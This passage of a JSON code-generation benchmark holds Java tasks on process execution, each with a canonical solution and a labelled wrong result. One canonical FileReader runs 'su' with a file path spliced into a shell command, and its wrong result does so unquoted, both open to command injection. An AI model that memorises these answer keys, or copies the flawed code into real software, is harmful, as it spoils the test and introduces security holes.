    "Canonical_solution": "import com.google.common.base.Joiner;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class ProcessRunner {\n\n  File processRoot;\n\n  public ProcessRunner(File processRoot) {\n    this.processRoot = processRoot;\n  }\n\n  public void execute(ProcessBuilder pb) throws IOException, InterruptedException {\n    System.out.println(Joiner.on(\" \").join(pb.command()));\n    Process process = pb.redirectErrorStream(true).directory(processRoot).start();\n    new AsyncPipe(process.getErrorStream(), System.err).start();\n    new AsyncPipe(process.getInputStream(), System.out).start();\n    process.waitFor();\n  }\n\n  class AsyncPipe extends Thread {\n\n    InputStream is;\n    OutputStream os;\n    boolean closeStreams;\n\n    AsyncPipe(InputStream is, OutputStream os) {\n      this.is = is;\n      this.os = os;\n      closeStreams = true;\n    }\n\n    AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n      this.is = is;\n      this.os = os;\n      this.closeStreams = closeStreams;\n    }\n\n    @Override\n    public void run() {\n      try {\n        synchronized (this) {\n          byte[] buf = new byte[4096];\n          int i;\n          while ((i = is.read(buf)) != -1) {\n            os.write(buf, 0, i);\n          }\n          if (closeStreams) {\n            os.close();\n            is.close();\n          }\n        }\n      } catch (IOException e) {\n        e.printStackTrace();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ProcessRunner {\n    private final File processRoot;\n\n    public ProcessRunner(File processRoot) {\n        this.processRoot = processRoot;\n    }\n\n    public void execute(ProcessBuilder pb) {\n        pb.directory(processRoot);\n        pb.redirectErrorStream(true);\n        try {\n            Process process = pb.start();\n            Thread outputThread = new Thread(new AsyncPipe(process.getInputStream(), System.out));\n            Thread errorThread = new Thread(new AsyncPipe(process.getErrorStream(), System.err, false));\n            outputThread.start();\n            errorThread.start();\n            int exitCode = process.waitFor();\n            outputThread.join();\n            errorThread.join();\n            System.out.println(\"Process exited with code: \" + exitCode);\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public class AsyncPipe implements Runnable {\n        private final InputStream is;\n        private final OutputStream os;\n        private final boolean closeStreams;\n\n        public AsyncPipe(InputStream is, OutputStream os) {\n            this(is, os, true);\n        }\n\n        public AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n            this.is = is;\n            this.os = os;\n            this.closeStreams = closeStreams;\n        }\n\n        @Override\n        public void run() {\n            try {\n                byte[] buffer = new byte[1024];\n                int len;\n                while ((len = is.read(buffer)) != -1) {\n                    os.write(buffer, 0, len);\n                    os.flush();\n                }\n                if (closeStreams) {\n                    is.close();\n                    os.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 273,
    "Instruction": "Task Description: Create a Java class that extends the Reader abstract class to read files, with fallback to using system commands when direct file access fails (e.g., when running with restricted permissions).\n\nClass Description: FileReader is a Reader implementation that first attempts to read files directly, and if that fails (due to permission issues), it falls back to executing system commands (via su and cat/toolbox cat) to read the file contents. The class handles process creation, stream management, and proper cleanup.\n\nAttributes:\nmStream: InputStreamReader - The underlying input stream used for reading file contents, either from direct file access or process output\n\nMethods:\nFileReader: [Constructor](Shell shell, String file) -> [void] - Initializes the reader by attempting direct file access first, falling back to process-based reading if needed. Throws FileNotFoundException if neither method succeeds.\n- shell: Shell - Optional shell helper object to locate system commands\n- file: String - Path to the file to be read\n\nclose: close() -> [void] - Closes the underlying input stream. Throws IOException if the stream cannot be closed.\n\nread: read(char[] buffer, int offset, int count) -> [int] - Reads characters into a portion of an array from the underlying stream. Returns the number of characters read or -1 if end of stream is reached.\n- buffer: char[] - Destination buffer\n- offset: int - Offset at which to start storing characters\n- count: int - Maximum number of characters to read",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.nio.CharBuffer;\n\npublic class FileReader extends Reader {\n    protected InputStreamReader mStream;\n\n    public FileReader(Shell shell, String file) throws FileNotFoundException {\n        String filePath = new File(file).getAbsolutePath();\n\n        try {\n            mStream = new InputStreamReader(new FileInputStream(filePath));\n\n        } catch (FileNotFoundException e) {\n            String binary = shell != null ? shell.findCommand(\"cat\") : \"toolbox cat\";\n\n            try {\n                ProcessBuilder builder = new ProcessBuilder(\"su\");\n                builder.redirectErrorStream(true);\n\n                Process process = builder.start();\n                mStream = new InputStreamReader(process.getInputStream());\n\n                DataOutputStream stdIn = new DataOutputStream(process.getOutputStream());\n                stdIn.write( (binary + \" '\" + filePath + \"'\\n\").getBytes() );\n                stdIn.write( (\"exit $?\\n\").getBytes() );\n                stdIn.flush();\n                stdIn.close();\n\n                Integer resultCode = process.waitFor();\n\n                if (!resultCode.equals(0)) {\n                    throw new FileNotFoundException(e.getMessage());\n                }\n\n            } catch (Throwable te) {\n                throw new FileNotFoundException(te.getMessage());\n            }\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        mStream.close();\n    }\n\n    @Override\n    public int read(char[] buffer, int offset, int count) throws IOException {\n        return mStream.read(buffer, offset, count);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class FileReader extends Reader {\n    private InputStreamReader mStream;\n\n    public FileReader(Shell shell, String file) throws FileNotFoundException {\n        try {\n            FileInputStream fis = new FileInputStream(file);\n            mStream = new InputStreamReader(fis);\n        } catch (FileNotFoundException e) {\n            if (shell == null) {\n                throw new FileNotFoundException(\"Shell is required for fallback\");\n            }\n            try {\n                Process process = shell.executeCommand(\"toolbox cat \" + file);\n                InputStream is = process.getInputStream();\n                mStream = new InputStreamReader(is);\n            } catch (IOException ex) {\n                throw new FileNotFoundException(\"Failed to read via fallback\");\n            }\n        } catch (IOException e) {\n            throw new FileNotFoundException(\"Direct read failed\");\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (mStream != null) {\n            mStream.close();\n        }\n    }\n\n    @Override\n    public int read() throws IOException {\n        return mStream.read();\n    }\n\n    @Override\n    public int read(char[] cbuf) throws IOException {\n        return mStream.read(cbuf);\n    }\n\n    @Override\n    public int read(char[] cbuf, int off, int len) throws IOException {\n        return mStream.read(cbuf, off, len);\n    }\n}"
  },
  {
    "Task_id": 274,
    "Instruction": "Task Description: Create a Java class that implements shell command execution functionality, allowing for command input, output reading, and process management.\n\nClass Description: ProcessShell is a class that provides an interface for executing shell commands, managing the process lifecycle, and handling input/output streams. It extends AbstractShell and supports both regular and root command execution.\n\nAttributes:\n- mProcess: Process - The running process instance\n- mCommandOutputStream: DataOutputStream - Stream for writing commands to the process\n- mSucceedReader: BufferedReader - Reader for standard output stream\n- mErrorReader: BufferedReader - Reader for error output stream\n- mSucceedOutput: StringBuilder - Buffer for storing standard output\n- mErrorOutput: StringBuilder - Buffer for storing error output\n\nMethods:\n- init(String initialCommand) -> void - Initializes the shell process with the given command\n- exec(String command) -> void - Executes the given command in the shell\n- exit() -> void - Terminates the process and cleans up resources\n- exitAndWaitFor() -> void - Sends exit command, waits for process completion, then exits\n- waitFor() -> int - Waits for the process to complete and returns exit code\n- readAll() -> ProcessShell - Reads all available output (both standard and error)\n- readSucceedOutput() -> ProcessShell - Reads standard output\n- readErrorOutput() -> ProcessShell - Reads error output\n- getSucceedOutput() -> StringBuilder - Returns the standard output buffer\n- getErrorOutput() -> StringBuilder - Returns the error output buffer\n- getProcess() -> Process - Returns the process instance\n- getSucceedReader() -> BufferedReader - Returns the standard output reader\n- getErrorReader() -> BufferedReader - Returns the error output reader",
    "Canonical_solution": "import android.util.Log;\nimport com.stardust.autojs.runtime.api.AbstractShell;\nimport com.stardust.autojs.runtime.exception.ScriptInterruptedException;\nimport com.stardust.autojs.util.ProcessUtils;\nimport com.stardust.pio.UncheckedIOException;\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\n\npublic class ProcessShell extends AbstractShell {\n\n    private static final String TAG = \"ProcessShell\";\n    private Process mProcess;\n    private DataOutputStream mCommandOutputStream;\n    private BufferedReader mSucceedReader;\n    private BufferedReader mErrorReader;\n    private StringBuilder mSucceedOutput = new StringBuilder();\n    private StringBuilder mErrorOutput = new StringBuilder();\n\n    public ProcessShell() {\n    }\n\n    public ProcessShell(boolean root) {\n        super(root);\n    }\n\n    @Override\n    protected void init(String initialCommand) {\n        try {\n            mProcess = new ProcessBuilder(initialCommand).redirectErrorStream(true).start();\n            mCommandOutputStream = new DataOutputStream(mProcess.getOutputStream());\n            mSucceedReader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));\n            mErrorReader = new BufferedReader(new InputStreamReader(mProcess.getErrorStream()));\n        } catch (IOException e) {\n            throw new UncheckedIOException(e);\n        }\n    }\n\n    @Override\n    public void exec(String command) {\n        try {\n            mCommandOutputStream.writeBytes(command);\n            if (!command.endsWith(COMMAND_LINE_END)) {\n                mCommandOutputStream.writeBytes(COMMAND_LINE_END);\n            }\n            mCommandOutputStream.flush();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public void exit() {\n        if (mProcess != null) {\n            Log.d(TAG, \"exit: pid = \" + ProcessUtils.getProcessPid(mProcess));\n            mProcess.destroy();\n            mProcess = null;\n        }\n        if (mSucceedReader != null) {\n            try {\n                mSucceedReader.close();\n            } catch (IOException ignored) {\n            }\n            mSucceedReader = null;\n        }\n        if (mErrorReader != null) {\n            try {\n                mErrorReader.close();\n            } catch (IOException ignored) {\n            }\n            mErrorReader = null;\n        }\n    }\n\n    @Override\n    public void exitAndWaitFor() {\n        exec(COMMAND_EXIT);\n        waitFor();\n        exit();\n    }\n\n    public int waitFor() {\n        try {\n            return mProcess.waitFor();\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public ProcessShell readAll() {\n        return readSucceedOutput().readErrorOutput();\n    }\n\n    public ProcessShell readSucceedOutput() {\n        read(mSucceedReader, mSucceedOutput);\n        return this;\n    }\n\n    private void read(BufferedReader reader, StringBuilder sb) {\n        try {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line).append(\"\\n\");\n            }\n        } catch (IOException e) {\n            throw new UncheckedIOException(e);\n        }\n    }\n\n    public ProcessShell readErrorOutput() {\n        read(mErrorReader, mErrorOutput);\n        return this;\n    }\n\n    public StringBuilder getSucceedOutput() {\n        return mSucceedOutput;\n    }\n\n    public StringBuilder getErrorOutput() {\n        return mErrorOutput;\n    }\n\n    public Process getProcess() {\n        return mProcess;\n    }\n\n    public BufferedReader getSucceedReader() {\n        return mSucceedReader;\n    }\n\n    public BufferedReader getErrorReader() {\n        return mErrorReader;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ProcessShell extends AbstractShell {\n    private Process mProcess;\n    private DataOutputStream mCommandOutputStream;\n    private BufferedReader mSucceedReader;\n    private BufferedReader mErrorReader;\n    private StringBuilder mSucceedOutput;\n    private StringBuilder mErrorOutput;\n\n    public void init(String initialCommand) {\n        try {\n            mProcess = Runtime.getRuntime().exec(initialCommand);\n            mCommandOutputStream = new DataOutputStream(mProcess.getOutputStream());\n            mSucceedReader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));\n            mErrorReader = new BufferedReader(new InputStreamReader(mProcess.getErrorStream()));\n            mSucceedOutput = new StringBuilder();\n            mErrorOutput = new StringBuilder();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void exec(String command) {\n        try {\n            mCommandOutputStream.writeBytes(command + \"\\n\");\n            mCommandOutputStream.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void exit() {\n        if (mProcess != null) {\n            mProcess.destroy();\n        }\n        try {\n            if (mCommandOutputStream != null) mCommandOutputStream.close();\n            if (mSucceedReader != null) mSucceedReader.close();\n            if (mErrorReader != null) mErrorReader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void exitAndWaitFor() {\n        exec(\"exit\");\n        waitFor();\n        exit();\n    }\n\n    public int waitFor() {\n        try {\n            return mProcess.waitFor();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n            return -1;\n        }\n    }\n\n    public ProcessShell readAll() {\n        try {\n            String line;\n            while ((line = mSucceedReader.readLine()) != null) {\n                mSucceedOutput.append(line).append(\"\\n\");\n            }\n            while ((line = mErrorReader.readLine()) != null) {\n                mErrorOutput.append(line).append(\"\\n\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return this;\n    }\n\n    public ProcessShell readSucceedOutput() {\n        try {\n            String line;\n            while ((line = mSucceedReader.readLine()) != null) {\n                mSucceedOutput.append(line).append(\"\\n\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return this;\n    }\n\n    public ProcessShell readErrorOutput() {\n        try {\n            String line;\n            while ((line = mErrorReader.readLine()) != null) {\n                mErrorOutput.append(line).append(\"\\n\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return this;\n    }\n\n    public StringBuilder getSucceedOutput() {\n        return mSucceedOutput;\n    }\n\n    public StringBuilder getErrorOutput() {\n        return mErrorOutput;\n    }\n\n    public Process getProcess() {\n        return mProcess;\n    }\n\n    public BufferedReader getSucceedReader() {\n        return mSucceedReader;\n    }\n\n    public BufferedReader getErrorReader() {\n        return mErrorReader;\n    }\n}"
  },
  {
    "Task_id": 275,
    "Instruction": "Task Description: Create a Java class that manages external processes, handling their input/output streams and providing control over process execution, including starting, stopping, and monitoring.\n\nClass Description: The DaemonHandler class is designed to manage external processes executed via ProcessBuilder. It provides functionality to start processes with either delimited or undelimited output handling, stop processes (either gracefully or forcibly), and retrieve process exit codes. The class maintains separate threads for handling standard output and error streams, with output being captured and placed into a shared blocking deque.\n\nAttributes:\n- processBuilder: ProcessBuilder - Configures and starts external processes\n- process: Process - Represents the currently running external process\n- outThread: Thread - Thread handling standard output stream\n- errThread: Thread - Thread handling error output stream\n- errProxy: OutputProxy - Proxy for handling error stream output\n- outProxy: OutputProxy - Proxy for handling standard output stream\n- deque: BlockingDeque<Event> - Shared queue for process output events\n- stdOut: boolean - Flag indicating whether to capture standard output\n\nMethods:\n- DaemonHandler(BlockingDeque<Event>, String...) -> void - Constructor that initializes the process handler with output queue and command\n- setStdOutListener(boolean) -> void - Sets whether to capture standard output\n- startDelimited() -> Process - Starts process with delimited output handling (using default delimiter)\n- startDelimited(byte) -> Process - Starts process with custom delimiter for output handling\n- startUndelimited() -> Process - Starts process with undelimited output handling (default buffer size)\n- startUndelimited(int) -> Process - Starts process with undelimited output handling (custom buffer size)\n- stop(boolean) -> void - Stops the managed process (optionally forcibly)\n- getExitCode() -> int - Retrieves the exit code of the process (or PROCESS_STOPPED if not running)",
    "Canonical_solution": "import com.linbit.extproc.OutputProxy.Event;\nimport java.io.IOException;\nimport java.lang.ProcessBuilder.Redirect;\nimport java.util.concurrent.BlockingDeque;\nimport java.util.concurrent.TimeUnit;\n\npublic class DaemonHandler\n{\n    public static final int PROCESS_STOPPED = Integer.MAX_VALUE;\n    private static final byte DELIMITER = '\\n';\n\n    private final ProcessBuilder processBuilder;\n    private Process process;\n\n    private Thread outThread;\n    private Thread errThread;\n    private OutputProxy errProxy;\n    private OutputProxy outProxy;\n\n    private final BlockingDeque<Event> deque;\n    private boolean stdOut;\n\n    public DaemonHandler(final BlockingDeque<Event> dequeRef, final String... command)\n    {\n        deque = dequeRef;\n        processBuilder = new ProcessBuilder(command);\n        processBuilder.redirectError(Redirect.PIPE);\n        stdOut = true;\n    }\n\n    public void setStdOutListener(boolean stdOutRef)\n    {\n        stdOut = stdOutRef;\n    }\n\n    public Process startDelimited() throws IOException\n    {\n        return startDelimited(DELIMITER);\n    }\n\n    public Process startDelimited(byte delimiterRef) throws IOException\n    {\n        stop(true);\n\n        process = processBuilder.start();\n        errProxy = new OutputProxyDelimited(process.getErrorStream(), deque, delimiterRef, false);\n        errThread = new Thread(errProxy);\n        if (stdOut)\n        {\n            outProxy = new OutputProxyDelimited(process.getInputStream(), deque, delimiterRef, true);\n            outThread = new Thread(outProxy);\n            outThread.start();\n        }\n        errThread.start();\n        return process;\n    }\n\n    public Process startUndelimited() throws IOException\n    {\n        return startUndelimited(OutputProxy.DFLT_BUFFER_SIZE);\n    }\n\n    public Process startUndelimited(int bufferSize) throws IOException\n    {\n        stop(true);\n\n        process = processBuilder.start();\n        errProxy = new OutputProxy(process.getErrorStream(), deque, false, bufferSize);\n        errThread = new Thread(errProxy);\n        if (stdOut)\n        {\n            outProxy = new OutputProxy(process.getInputStream(), deque, true, bufferSize);\n            outThread = new Thread(outProxy);\n            outThread.start();\n        }\n        errThread.start();\n        return process;\n    }\n\n    public void stop(boolean force)\n    {\n        if (process != null)\n        {\n            if (outProxy != null)\n            {\n                outProxy.expectShutdown();\n            }\n            errProxy.expectShutdown();\n            if (force)\n            {\n                process.destroyForcibly();\n            }\n            else\n            {\n                process.destroy();\n            }\n            if (outThread != null)\n            {\n                outThread.interrupt();\n            }\n            errThread.interrupt();\n            process = null;\n        }\n    }\n\n    public int getExitCode()\n    {\n        int exitValue;\n        Process proc = process;\n        if (proc != null)\n        {\n            if (proc.isAlive())\n            {\n                try\n                {\n                    proc.waitFor(500, TimeUnit.MILLISECONDS);\n                }\n                catch (InterruptedException ignored)\n                {\n                }\n                if (proc.isAlive())\n                {\n                    throw new ImplementationError(\"Process is still running\");\n                }\n            }\n            exitValue = proc.exitValue();\n        }\n        else\n        {\n            exitValue = PROCESS_STOPPED;\n        }\n        return exitValue;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class DaemonHandler {\n    private final BlockingDeque<Event> deque;\n    private final String[] command;\n    private ProcessBuilder processBuilder;\n    private Process process;\n    private Thread outThread;\n    private Thread errThread;\n    private OutputProxy outProxy;\n    private OutputProxy errProxy;\n    private boolean stdOut;\n    private static final int PROCESS_STOPPED = -1;\n\n    public DaemonHandler(BlockingDeque<Event> deque, String... command) {\n        this.deque = deque;\n        this.command = command;\n        this.processBuilder = new ProcessBuilder(command);\n        this.stdOut = true;\n    }\n\n    public void setStdOutListener(boolean stdOut) {\n        this.stdOut = stdOut;\n    }\n\n    public Process startDelimited() {\n        return startDelimited((byte) '\\n');\n    }\n\n    public Process startDelimited(byte delimiter) {\n        try {\n            process = processBuilder.start();\n            outProxy = new OutputProxy(deque, process.getInputStream(), delimiter, true);\n            errProxy = new OutputProxy(deque, process.getErrorStream(), delimiter, false);\n            outThread = new Thread(outProxy, \"stdout-thread\");\n            errThread = new Thread(errProxy, \"stderr-thread\");\n            outThread.start();\n            errThread.start();\n            return process;\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    public Process startUndelimited() {\n        return startUndelimited(8192);\n    }\n\n    public Process startUndelimited(int bufferSize) {\n        try {\n            process = processBuilder.start();\n            outProxy = new OutputProxy(deque, process.getInputStream(), bufferSize, true);\n            errProxy = new OutputProxy(deque, process.getErrorStream(), bufferSize, false);\n            outThread = new Thread(outProxy, \"stdout-thread\");\n            errThread = new Thread(errProxy, \"stderr-thread\");\n            outThread.start();\n            errThread.start();\n            return process;\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    public void stop(boolean force) {\n        if (process != null) {\n            if (force) {\n                process.destroyForcibly();\n            } else {\n                process.destroy();\n            }\n        }\n    }\n\n    public int getExitCode() {\n        if (process == null || !process.isAlive()) {\n            return PROCESS_STOPPED;\n        }\n        try {\n            return process.exitValue();\n        } catch (IllegalThreadStateException e) {\n            return PROCESS_STOPPED;\n        }\n    }\n\n    private class OutputProxy implements Runnable {\n        private final BlockingDeque<Event> deque;\n        private final InputStream inputStream;\n        private final Object handler;\n        private final boolean isStdOut;\n\n        public OutputProxy(BlockingDeque<Event> deque, InputStream inputStream, Object handler, boolean isStdOut) {\n            this.deque = deque;\n            this.inputStream = inputStream;\n            this.handler = handler;\n            this.isStdOut = isStdOut;\n        }\n\n        @Override\n        public void run() {\n            try {\n                if (handler instanceof Byte) {\n                    byte delimiter = (Byte) handler;\n                    byte[] buffer = new byte[1024];\n                    int bytesRead;\n                    StringBuilder sb = new StringBuilder();\n                    while ((bytesRead = inputStream.read(buffer)) != -1) {\n                        for (int i = 0; i < bytesRead; i++) {\n                            if (buffer[i] == delimiter) {\n                                deque.put(new Event(sb.toString(), isStdOut));\n                                sb = new StringBuilder();\n                            } else {\n                                sb.append((char) buffer[i]);\n                            }\n                        }\n                    }\n                    if (sb.length() > 0) {\n                        deque.put(new Event(sb.toString(), isStdOut));\n                    }\n                } else if (handler instanceof Integer) {\n                    int bufferSize = (Integer) handler;\n                    byte[] buffer = new byte[bufferSize];\n                    int bytesRead;\n                    while ((bytesRead = inputStream.read(buffer)) != -1) {\n                        deque.put(new Event(new String(buffer, 0, bytesRead), isStdOut));\n                    }\n                }\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 276,
    "Instruction": "Task Description: Create a Java abstract class that provides functionality for executing external scripts in a cross-platform manner, handling both input and error streams concurrently, and logging the results.\n\nClass Description: AbstractScriptProcessor is an abstract base class designed to execute external scripts (shell scripts for Unix-like systems or batch files for Windows) while properly handling process streams and logging. It uses ProcessBuilder for process creation and ForkJoinPool for concurrent stream handling.\n\nAttributes:\n- POOL: [ForkJoinPool] - A shared thread pool for concurrent stream processing\n- SH_SHELL: [String] - Constant for Unix shell path (/bin/sh)\n- CMD_SHELL: [String] - Constant for Windows command processor (cmd.exe)\n\nMethods:\n- executeScript: [TaskContext context, String scriptPath] -> [ProcessResult] - Executes the specified script file, handles platform compatibility checks, manages process streams, and returns execution results\n- copyStream: [InputStream is, StringBuilder sb, OmsLogger omsLogger, Charset charset] -> [void] - Helper method to copy stream contents to a StringBuilder while logging\n- getRunCommand: [] -> [String] - Abstract method to be implemented by subclasses to return the appropriate shell command\n- getCharset: [] -> [Charset] - Returns the charset to use for stream processing (defaults to UTF-8)",
    "Canonical_solution": "import tech.powerjob.worker.core.processor.ProcessResult;\nimport tech.powerjob.worker.core.processor.TaskContext;\nimport tech.powerjob.worker.log.OmsLogger;\nimport org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.lang3.SystemUtils;\nimport java.io.*;\nimport java.nio.charset.Charset;\nimport java.nio.file.Files;\nimport java.util.concurrent.ForkJoinPool;\nimport java.util.concurrent.ForkJoinTask;\n\npublic abstract class AbstractScriptProcessor {\n\n    private static final ForkJoinPool POOL = new ForkJoinPool(4 * Runtime.getRuntime().availableProcessors());\n    protected static final String SH_SHELL = \"/bin/sh\";\n    protected static final String CMD_SHELL = \"cmd.exe\";\n\n    protected ProcessResult executeScript(TaskContext context, String scriptPath) throws Exception {\n        OmsLogger omsLogger = context.getOmsLogger();\n        \n        if (SystemUtils.IS_OS_WINDOWS && StringUtils.equals(getRunCommand(), SH_SHELL)) {\n            String message = String.format(\"[SYSTEM] Current OS is %s where shell scripts cannot run.\", SystemUtils.OS_NAME);\n            omsLogger.warn(message);\n            return new ProcessResult(false, message);\n        }\n\n        ProcessBuilder pb = StringUtils.equals(getRunCommand(), CMD_SHELL) ?\n                new ProcessBuilder(getRunCommand(), \"/c\", scriptPath)\n                : new ProcessBuilder(getRunCommand(), scriptPath);\n        Process process = pb.start();\n\n        StringBuilder inputBuilder = new StringBuilder();\n        StringBuilder errorBuilder = new StringBuilder();\n\n        boolean success = true;\n        String result;\n\n        final Charset charset = getCharset();\n        try {\n            InputStream is = process.getInputStream();\n            InputStream es = process.getErrorStream();\n\n            ForkJoinTask<?> inputSubmit = POOL.submit(() -> copyStream(is, inputBuilder, omsLogger, charset));\n            ForkJoinTask<?> errorSubmit = POOL.submit(() -> copyStream(es, errorBuilder, omsLogger, charset));\n\n            success = process.waitFor() == 0;\n\n            inputSubmit.get();\n            errorSubmit.get();\n\n        } catch (InterruptedException ie) {\n            omsLogger.info(\"[SYSTEM] ScriptProcessor has been interrupted\");\n        } finally {\n            result = String.format(\"[INPUT]: %s;[ERROR]: %s\", inputBuilder, errorBuilder);\n        }\n        return new ProcessResult(success, result);\n    }\n\n    private void copyStream(InputStream is, StringBuilder sb, OmsLogger omsLogger, Charset charset) {\n        String line;\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(is, charset))) {\n            while ((line = br.readLine()) != null) {\n                sb.append(line).append(System.lineSeparator());\n                omsLogger.info(line);\n            }\n        } catch (Exception e) {\n            omsLogger.warn(\"[SYSTEM] copyStream failed.\", e);\n            sb.append(\"Exception: \").append(e);\n        } finally {\n            try {\n                is.close();\n            } catch (IOException e) {\n                omsLogger.warn(\"[SYSTEM] close stream failed.\", e);\n            }\n        }\n    }\n\n    protected abstract String getRunCommand();\n\n    protected Charset getCharset() {\n        return StandardCharsets.UTF_8;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public abstract class AbstractScriptProcessor {\n    public static final ForkJoinPool POOL = ForkJoinPool.commonPool();\n    public static final String SH_SHELL = \"/bin/sh\";\n    public static final String CMD_SHELL = \"cmd.exe\";\n\n    protected abstract String getRunCommand();\n\n    protected Charset getCharset() {\n        return Charset.forName(\"UTF-8\");\n    }\n\n    public ProcessResult executeScript(TaskContext context, String scriptPath) {\n        boolean isWindows = System.getProperty(\"os.name\").toLowerCase().contains(\"win\");\n        List<String> command = new ArrayList<>();\n        command.add(getRunCommand());\n        if (isWindows) {\n            command.add(\"/c\");\n        }\n        command.add(scriptPath);\n\n        try {\n            ProcessBuilder pb = new ProcessBuilder(command);\n            Process process = pb.start();\n\n            StringBuilder output = new StringBuilder();\n            StringBuilder error = new StringBuilder();\n\n            POOL.submit(() -> copyStream(process.getInputStream(), output, context.getOmsLogger(), getCharset()));\n            POOL.submit(() -> copyStream(process.getErrorStream(), error, context.getOmsLogger(), getCharset()));\n\n            int exitCode = process.waitFor();\n\n            return new ProcessResult(exitCode, output.toString(), error.toString());\n        } catch (Exception e) {\n            return new ProcessResult(-1, \"\", e.getMessage());\n        }\n    }\n\n    private void copyStream(InputStream is, StringBuilder sb, OmsLogger omsLogger, Charset charset) {\n        try (InputStreamReader reader = new InputStreamReader(is, charset); BufferedReader bufferedReader = new BufferedReader(reader)) {\n            String line;\n            while ((line = bufferedReader.readLine()) != null) {\n                sb.append(line).append(\"\\n\");\n                omsLogger.log(line);\n            }\n        } catch (Exception e) {\n            omsLogger.log(\"Error reading stream: \" + e.getMessage());\n        }\n    }\n}"
  },
  {
    "Task_id": 277,
    "Instruction": "Task Description: The task involves creating a Java class that utilizes ProcessBuilder to execute external processes, specifically for performance monitoring and data collection using the 'perf' tool. The class should handle process execution, stream management, and synchronization.\n\nClass Description: This class is designed to interact with the Linux 'perf' performance monitoring tool. It provides functionality to parse performance events and add JVM invocation options for performance recording. The class manages process execution, handles input/output streams, and ensures proper synchronization.\n\nAttributes:\n- sampleFrequency: [String] - The sampling frequency for performance recording\n- optFrequency: [OptionSpec<String>] - Configuration option for frequency setting\n- perfBinData: [File] - File object storing binary performance data (implied from context)\n- perfParsedData: [File] - File object for storing parsed performance data (implied from context)\n- requestedEventNames: [Collection<String>] - Collection of performance event names to monitor (implied from context)\n\nMethods:\n- parseEvents() -> [void] - Executes the 'perf script' command to parse binary performance data, redirects process output streams to a file, and waits for process completion\n- addJVMInvokeOptions(BenchmarkParams params) -> [Collection<String>] - Generates command-line options for 'perf record' with specified sampling frequency and events\n- InputStreamDrainer(InputStream, OutputStream) -> [void] - Helper class/thread for draining process streams (implied from context)",
    "Canonical_solution": "import java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.Arrays;\nimport java.util.Collection;\nimport org.openjdk.jmh.infra.BenchmarkParams;\nimport org.openjdk.jmh.util.Utils;\n\nprivate String sampleFrequency;\nprivate OptionSpec<String> optFrequency;\n\n@Override\nprotected void parseEvents() {\n    try (FileOutputStream fos = new FileOutputStream(perfParsedData.file())) {\n        ProcessBuilder pb = new ProcessBuilder(PerfSupport.PERF_EXEC, \"script\", \"--fields\", \"time,event,ip,sym,dso\", \"--input\", perfBinData.getAbsolutePath());\n        Process p = pb.start();\n\n        InputStreamDrainer errDrainer = new InputStreamDrainer(p.getErrorStream(), fos);\n        InputStreamDrainer outDrainer = new InputStreamDrainer(p.getInputStream(), fos);\n\n        errDrainer.start();\n        outDrainer.start();\n\n        p.waitFor();\n\n        errDrainer.join();\n        outDrainer.join();\n    } catch (IOException | InterruptedException ex) {\n        throw new IllegalStateException(ex);\n    }\n}\n\n@Override\npublic Collection<String> addJVMInvokeOptions(BenchmarkParams params) {\n    return Arrays.asList(PerfSupport.PERF_EXEC, \"record\", \"--freq\", String.valueOf(sampleFrequency), \"--event\", Utils.join(requestedEventNames, \",\"), \"--output\", perfBinData.getAbsolutePath());\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
